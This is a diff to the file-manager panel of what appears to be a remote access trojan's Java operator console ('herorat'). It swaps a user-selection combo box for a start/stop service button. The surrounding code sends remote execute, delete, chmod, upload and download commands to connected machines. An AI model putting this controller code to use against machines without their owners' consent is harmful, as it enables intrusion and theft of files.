@@ -23,6 +23,7 @@ import javax.swing.JTable;
 import javax.swing.JTextField;
 import javax.swing.border.TitledBorder;
 
+import net.herorat.Main;
 import net.herorat.features.file.File;
 import net.herorat.features.servers.Server;
 import net.herorat.network.Network;
@@ -34,9 +35,11 @@ public class PanelFile extends JPanel
 	private static final long serialVersionUID = -3831734979469272408L;
 	
 	private JLabel label_select;
-	public JComboBox<String> combo_select;
-	public String combo_selected_item = "";
-	
+	private JButton button_start;
+	private boolean running= false;
+
+	private Server server;
+
 	private JPopupMenu menu_dropdown;
 	
 	private JLabel label_path;
@@ -80,16 +83,27 @@ public class PanelFile extends JPanel
 	
 	private void createSelect()
 	{
-		label_select = new JLabel("Select an user: ");
-		combo_select = new JComboBox<String>( Network.getServerList(false) );
-		
+		label_select = new JLabel("Select a user from the tree list.");
+//		combo_select = new JComboBox<String>( Network.getServerList(false) );
+		button_start = new JButton("Start service");
+		button_start.addActionListener(new ActionListener() {
+			@Override
+			public void actionPerformed(ActionEvent e) {
+				if(running){
+					stopService();
+				}else{
+					startService();
+				}
+			}
+		});
+
+
 		label_path = new JLabel("Path: ");
 		field_path = new JTextField();
 		button_path = new JButton("Go");
 		button_path.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent evt)
 			{
-				Server server = Network.findWithCombo(combo_selected_item);
 				if (server != null) File.sendCd(server, field_path.getText());
 			}
 		});
@@ -101,7 +115,7 @@ public class PanelFile extends JPanel
 		first_panel.setLayout(new BorderLayout(5, 0));
 		first_panel.setBorder(BorderFactory.createEmptyBorder(0, 2, 0, 2));
 		first_panel.add(label_select, BorderLayout.LINE_START);
-		first_panel.add(combo_select);
+		first_panel.add(button_start, BorderLayout.LINE_END);
 		top_panel.add(first_panel, BorderLayout.NORTH);
 		
 		JPanel second_panel = new JPanel();
@@ -114,34 +128,39 @@ public class PanelFile extends JPanel
 		
 		add(top_panel, BorderLayout.NORTH);
 		
-		combo_select.addActionListener(new ActionListener() {
-			@Override
-			public void actionPerformed(ActionEvent arg0)
-			{
-				String selection = String.valueOf(combo_select.getSelectedItem());
-				if (combo_select.getSelectedIndex() != 0 && !selection.equals(combo_selected_item))
-				{
-					combo_selected_item = selection;
-					Server server = Network.findWithCombo(combo_selected_item);
-					if (server != null)
-					{
-						// INIT DATA TRANSFERT
-						File.sendPath(server);
-						File.sendRoot(server);
-						File.sendCd(server, "");
-					}
-				}
-				else if (combo_select.getSelectedIndex() == 0)
-				{
-					combo_selected_item = "";
-					field_path.setText("");
-					for(int i=model_roots.getRowCount() - 1; i>=0; i--) model_roots.removeRow(i);
-					for(int i=model_files.getRowCount() - 1; i>=0; i--) model_files.removeRow(i);
-				}
-			}
-		});
+
 	}
-	
+
+    public Server getSelectedServer(){
+        return server;
+    }
+
+	private void startService(){
+		server = Main.mainWindow.ServerStatusTree.getSelectedServer();
+		if (server != null) {
+			running = true;
+            button_start.setText("Stop service");
+            label_select.setText("Talking to: "+server.getServerName()+"@"+server.getIp());
+			// INIT DATA TRANSFERT
+			File.sendPath(server);
+			File.sendRoot(server);
+			File.sendCd(server, "");
+		}else{
+			stopService();
+		}
+	}
+
+	private void stopService(){
+        button_start.setText("Start service");
+        label_select.setText("Select a user from the tree list.");
+        field_path.setText("");
+        server = null;
+        running = false;
+        for(int i=model_roots.getRowCount() - 1; i>=0; i--) model_roots.removeRow(i);
+        for(int i=model_files.getRowCount() - 1; i>=0; i--) model_files.removeRow(i);
+    }
+
+
 	private void createDropDown()
 	{
 		menu_dropdown = new JPopupMenu();
@@ -153,7 +172,6 @@ public class PanelFile extends JPanel
 			public void actionPerformed(ActionEvent evt)
 			{
 				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
-				Server server = Network.findWithCombo(combo_selected_item);
 				if (server != null) File.sendExec(server, file);
 			}
 		});
@@ -166,7 +184,6 @@ public class PanelFile extends JPanel
 			public void actionPerformed(ActionEvent evt)
 			{
 				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
-				Server server = Network.findWithCombo(combo_selected_item);
 				if (server != null) File.sendEdit(server, file);
 			}
 		});
@@ -179,7 +196,6 @@ public class PanelFile extends JPanel
 			public void actionPerformed(ActionEvent evt)
 			{
 				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
-				Server server = Network.findWithCombo(combo_selected_item);
 				if (server != null) File.sendDelete(server, file);
 			}
 		});
@@ -192,7 +208,6 @@ public class PanelFile extends JPanel
 			public void actionPerformed(ActionEvent evt)
 			{
 				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
-				Server server = Network.findWithCombo(combo_selected_item);
 				String newName = (String)JOptionPane.showInputDialog(null, "Rename this file:", "Rename " + file, JOptionPane.QUESTION_MESSAGE, null, null, null);
 				if (server != null) File.sendRename(server, file, newName);
 			}
@@ -206,7 +221,6 @@ public class PanelFile extends JPanel
 			public void actionPerformed(ActionEvent evt)
 			{
 				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
-				Server server = Network.findWithCombo(combo_selected_item);
 				if (server != null) File.sendLock(server, file);
 			}
 		});
@@ -219,7 +233,6 @@ public class PanelFile extends JPanel
 			public void actionPerformed(ActionEvent evt)
 			{
 				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
-				Server server = Network.findWithCombo(combo_selected_item);
 				if (server != null) File.sendUnlock(server, file);
 			}
 		});
@@ -232,7 +245,6 @@ public class PanelFile extends JPanel
 			public void actionPerformed(ActionEvent evt)
 			{
 				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
-				Server server = Network.findWithCombo(combo_selected_item);
 				String rights = "";
 				rights = (String)JOptionPane.showInputDialog(null, "Enter the new rights value (ex: 777):");
 				if (server != null && Integer.parseInt(rights) > 0) File.sendChmod(server, file, rights);
@@ -248,7 +260,6 @@ public class PanelFile extends JPanel
 			public void actionPerformed(ActionEvent evt)
 			{
 				String file = current_path + table_files.getValueAt(table_files.getSelectedRow(), 1).toString();
-				Server server = Network.findWithCombo(combo_selected_item);
 				if (server != null && chooser_save.showSaveDialog(null) == 0)
 				{
 					File.sendDownload(server, file, chooser_save.getSelectedFile().getAbsolutePath());
@@ -316,7 +327,6 @@ public class PanelFile extends JPanel
 			{
 				if (e.getClickCount() == 2)
 				{
-					Server server = Network.findWithCombo(combo_selected_item);
 					if (server != null) 
 					{
 						String dir = table_roots.getValueAt(table_roots.getSelectedRow(), 1).toString();
@@ -333,7 +343,6 @@ public class PanelFile extends JPanel
 			{
 				if (e.getClickCount() == 2)
 				{
-					Server server = Network.findWithCombo(combo_selected_item);
 					if (server != null)
 					{
 						String file;
@@ -380,7 +389,6 @@ public class PanelFile extends JPanel
 		button_send.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent evt)
 			{
-				Server server = Network.findWithCombo(combo_selected_item);
 				if (server != null) File.sendUpload(server, field_send.getText());
 			}
 		});
